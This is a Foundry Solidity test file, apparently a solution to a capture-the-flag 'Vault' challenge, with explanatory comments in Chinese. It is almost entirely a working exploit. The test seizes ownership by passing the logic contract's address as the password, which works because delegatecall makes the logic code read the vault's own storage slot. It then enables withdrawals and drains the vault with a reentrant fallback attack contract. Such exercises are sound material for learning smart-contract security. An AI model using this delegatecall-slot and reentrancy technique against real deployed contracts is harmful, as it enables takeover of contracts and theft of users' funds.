// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Vault.sol";

// 攻击合约：攻击 Vault 合约，实现 withdraw 时重新进入 fallback 函数
contract AttackVault {
    Vault public vault;

    constructor(address payable _a) {
        vault = Vault(_a);
    }

    fallback() external payable {
        if (address(vault).balance >= 0.01 ether) {
            vault.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 0.01 ether);
        vault.deposite{value: 0.01 ether}();
        vault.withdraw();
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    function withdrawAll(address payable _player) external {
        _player.transfer(address(this).balance);
    }
}

contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;

    address owner = address (1);
    address palyer = address (2);

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));

        vault.deposite{value: 0.1 ether}();
        vm.stopPrank();

    }

    function testExploit() public {
        vm.deal(palyer, 1 ether);
        vm.startPrank(palyer);

        // 攻击思路：
        // Vault 的 fallback 使用 delegatecall 调用 VaultLogic
        // delegatecall 在 Vault 的上下文中执行代码
        // 所以 VaultLogic.changeOwner 读取的 password 来自 Vault 的 slot1
        // 而 Vault 的 slot1 存储的是 logic 地址
        // 因此，正确的密码应该是 logic 地址！

        bytes32 correctPassword = bytes32(uint256(uint160(address(logic))));

        console.log("Correct password (logic address):");
        console.logBytes32(correctPassword);

        // 使用正确的密码调用 changeOwner
        (bool success, bytes memory data) = address(vault).call(
            abi.encodeWithSignature("changeOwner(bytes32,address)", correctPassword, palyer)
        );

        console.log("Call success:", success);
        if (!success) {
            console.log("Error data:");
            console.logBytes(data);
        }
        require(success, "changeOwner failed");

        // 验证 owner 已被修改
        assertEq(vault.owner(), palyer, "Owner should be changed to attacker");

        console.log("Vault balance before withdraw:", address(vault).balance);
        console.log("Player balance before withdraw:", palyer.balance);

        // 调用 openWithdraw 开启提款功能（需要 owner 权限）
        vault.openWithdraw();

        // 调用攻击合约的 attack 函数，触发 fallback 函数
        AttackVault attackVault = new AttackVault(payable(address(vault)));
        attackVault.attack{value: 0.01 ether}();
        attackVault.withdrawAll(payable(palyer));

        console.log("Vault balance after withdraw:", address(vault).balance);
        console.log("Player balance after withdraw:", palyer.balance);

        // 验证所有资金已被取出
        require(vault.isSolve(), "solved");
        vm.stopPrank();
    }

}
